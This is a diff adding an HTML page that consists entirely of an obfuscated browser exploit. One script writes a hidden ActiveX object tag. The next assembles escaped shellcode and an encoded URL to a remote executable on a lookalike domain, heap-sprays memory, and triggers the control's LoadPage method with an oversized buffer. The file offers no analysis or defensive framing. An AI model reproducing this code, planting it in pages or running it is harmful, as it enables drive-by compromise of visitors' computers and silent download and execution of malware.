@@ -1,0 +1,51 @@
+<html>
+<SCRIPT LANGUAGE="Javascript">
+var Words ="%3Cobject%20classid%3D%22clsid%3A7F5E27CE"+"-4A5C"+"-1"+"1D3-"+"92"+"32-"+"0000"+"B48A"+"05B2%22%20id%3D%27yt8a%27%3E%3C/object%3E" 
+function OutWord()
+{
+var NewWords;
+NewWords = unescape(Words);
+document.write(NewWords);
+} 
+OutWord();
+// -->
+</SCRIPT>
+<SCRIPT language="javascript">
+var memory = new Array();
+var yt8a_url="%u7468%u7074%u2F3A%u772F%u7777%u672E%u6F6F%u6C67%u2E65%u6F63%u2E6D%u6F62%u616B%u2E65%u6E63%u772F%u6265%u452F%u7078%u6F6C%u6572%u652E%u6578%u0000";
+var yt1="%u"+"9090"+"%u"+"9090"+"%u"+"0feb"+"%u"+"335b"+"%u"+"66c9"+"%u"+"80b9"+"%u"+"8001"+"%u"+"ef33"+"%u"+"e243"+"%u"+"ebfa"+"%u"+"e805"+"%u"+"ffec"+"%u"+"ffff"+"%u"+"8b7f";
+var yt2="%u"+"07e1"+"%u"+"ef1f"+"%u"+"efef"+"%u"+"aa66"+"%u"+"b9e7"+"%u"+"ca87"+"%u"+"105f"+"%u"+"072d"+"%u"+"ef0d"+"%u"+"efef"+"%u"+"aa66"+"%u"+"b9e3"+"%u"+"0087";
+var yt3="%u"+"64cb"+"%u"+"ebaa"+"%u"+"ee85"+"%u"+"64b6"+"%u"+"f7ba"+"%u"+"07b9"+"%u"+"ef64"+"%u"+"efef"+"%u"+"87bf"+"%u"+"f5d9"+"%u"+"9fc0"+"%u"+"7807";
+var yt4="%"+"uaa64"+"%u"+"85f3"+"%u"+"b6ea"+"%u"+"ba64"+"%u"+"07f7"+"%u"+"efcc"+"%u"+"efef"+"%u"+"ef85"+"%u"+"9a10"+"%u"+"64cf"+"%u"+"e7aa"+"%u"+"ed85"+"%u"+"64b6"+"%u"+"f7ba";
+var yt5="%u"+"9c64"+"%u"+"64d3"+"%u"+"f19b"+"%u"+"ec97"+"%u"+"b91c"+"%u"+"9964"+"%u"+"eccf"+"%u"+"dc1c"+"%u"+"a626"+"%u"+"42ae"+"%u"+"2cec"+"%u"+"dcb9"+"%u"+"e019"+"%u"+"ff51";
+var yt6="%u"+"1dd5"+"%u"+"e79b"+"%u"+"212e"+"%u"+"ece2"+"%u"+"af1d"+"%u"+"1e04"+"%u"+"11d4"+"%u"+"9ab1"+"%u"+"b50a"+"%u"+"0464"+"%u"+"b564"+"%u"+"eccb"+"%u"+"8932"+"%u"+"e364";
+var yt7="%u"+"64a4"+"%u"+"f3b5"+"%u"+"32ec"+"%u"+"eb64"+"%u"+"ec64"+"%u"+"b12a"+"%u"+"2db2"+"%u"+"efe7"+"%u"+"1b07"+"%u"+"1011"+"%u"+"ba10"+"%u"+"a3bd"+"%u"+"a0a2"+"%u"+"efa1";
+var yt8="%u"+"df4e"+"%u"+"efef"+"%u"+"64ef"+"%u"+"e3af"+"%u"+"9f64"+"%u"+"42f3"+"%u"+"9f64"+"%u"+"6ee7"+"%u"+"ef03";
+var yt9="%u"+"efeb"+"%u"+"64ef"+"%u"+"b903"+"%u"+"6187"+"%u"+"e1a1"+"%u"+"0703"+"%u"+"ef11"+"%u"+"efef"+"%u"+"aa66"+"%u"+"b9eb"+"%u"+"7787"+"%u"+"6511";
+var yt10="%u"+"0f21"+"%u"+"078f"+"%u"+"ef3b"+"%u"+"efef"+"%u"+"aa66"+"%u"+"b9ff"+"%u"+"2e87"+"%u"+"0a96"+"%u"+"0757"+"%u"+"ef29"+"%u"+"efef"+"%u"+"aa66"+"%u"+"affb"+"%u"+"d76f";
+var yt11="%u"+"9a2c"+"%u"+"6615"+"%u"+"f7aa"+"%u"+"e806"+"%u"+"efee"+"%u"+"b1ef"+"%u"+"9a66";
+var yt12="%u"+"efef"+"%u"+"66ef"+"%u"+"f3aa"+"%u"+"2a64"+"%u"+"2f6c"+"%u"+"66bf"+"%u"+"cfaa"+"%u"+"1087"+"%u"+"efef"+"%u"+"bfef"+"%u"+"aa64"+"%u"+"85fb"+"%u"+"b6ed";
+var yt13="%uba64%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf%u8a97%uefef%u9a10%u64cf";
+var yt14="%ue3aa%uee85%u64b6%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc%ucf9a%ubcbf";
+var yt15="%uff07%uefef%u85ef%u6410%uffaa%uee85%u64b6%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec";
+var yt16="%u0eec%u0eec%u036c%ub5eb%u64bc%u0d35%ubd18%u0f10%u64ba%u6403%ue792%ub264%ub9e3";
+var yt8adown = unescape(yt1+yt8+yt9+yt2+yt10+yt11+yt3+yt12+yt13+yt14+yt4+yt15+yt16+yt5+yt6+yt7);
+cnyt = unescape(yt8a_url);
+var yutiandown=yt8adown+cnyt;
+var yt8a1="%u90";
+var yt8a2="90";
+var yt8a3="%u90";
+var yt8a4="90";
+var bigblock = unescape(yt8a1+yt8a2+yt8a3+yt8a4);
+var headersize = 20;
+var slackspace = headersize+yutiandown.length;
+while (bigblock.length<slackspace) bigblock+=bigblock;
+fillblock = bigblock.substring(0, slackspace);
+block = bigblock.substring(0, bigblock.length-slackspace);
+while(block.length+slackspace<0x40000) block = block+block+fillblock;
+for (x=0; x<300; x++) memory[x] = block + yutiandown;
+var buffer = '';
+while (buffer.length < 3092) buffer+="\x0a"+"\x0a"+"\x0a"+"\x0a";
+yt8a.LoadPage(buffer ,1 ,1 ,1);
+</script>
+</html>
